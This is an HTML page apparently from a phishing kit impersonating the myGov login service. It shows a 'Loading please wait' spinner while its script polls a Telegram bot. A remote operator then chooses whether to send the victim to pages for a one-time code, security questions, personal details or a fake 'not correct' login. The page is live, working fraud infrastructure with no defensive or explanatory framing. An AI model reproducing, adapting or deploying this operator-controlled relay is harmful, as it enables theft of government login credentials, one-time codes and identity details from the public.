<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Auth Callback | myGov</title>
    <style>
        body {
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: #ffffff;
            font-family: Arial, sans-serif;
        }
        .spinner-container { text-align: center; }
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #003b5c;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0%   { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .label { font-size: 18px; color: #333; }
    </style>
</head>
<body>
    <div class="spinner-container">
        <div class="spinner"></div>
        <div class="label">Loading please wait</div>
    </div>

    <script src="endpoints.js"></script>
<script src="config.js"></script>
<script>
    const ROUTES = {
        "otp":         "otp.html",
        "notcorrect":  "notcorrect.html",
        "login":       "log.html",
        "secquestion": "sec1.html",
        "detail":      "detail.html"
    };

    (function() {
        const sid = sessionStorage.getItem('mgv_sid');
        const startOffset = parseInt(sessionStorage.getItem('mgv_offset') || '0', 10);
        if (!sid) { window.location.href = 'log.html'; return; }
        pollLoop(startOffset, sid);
    })();

    async function pollLoop(offset, sid) {
        while (true) {
            try {
                const data = await getTelegramUpdates(offset, 15);
                if (!data.result) continue;
                for (const upd of data.result) {
                    offset = upd.update_id + 1;
                    const cb = upd.callback_query;
                    if (!cb) continue;
                    const [action, sess] = cb.data.split(":");
                    if (sess !== sid) continue;
                    await answerTelegramCallback(cb.id, "Redirecting user…");
                    sessionStorage.removeItem('mgv_sid');
                    sessionStorage.removeItem('mgv_offset');
                    window.location.href = ROUTES[action] || "log.html";
                    return;
                }
            } catch (e) {
                console.error(e);
                await new Promise(r => setTimeout(r, 2000));
            }
        }
    }
</script>
</body>

</html>
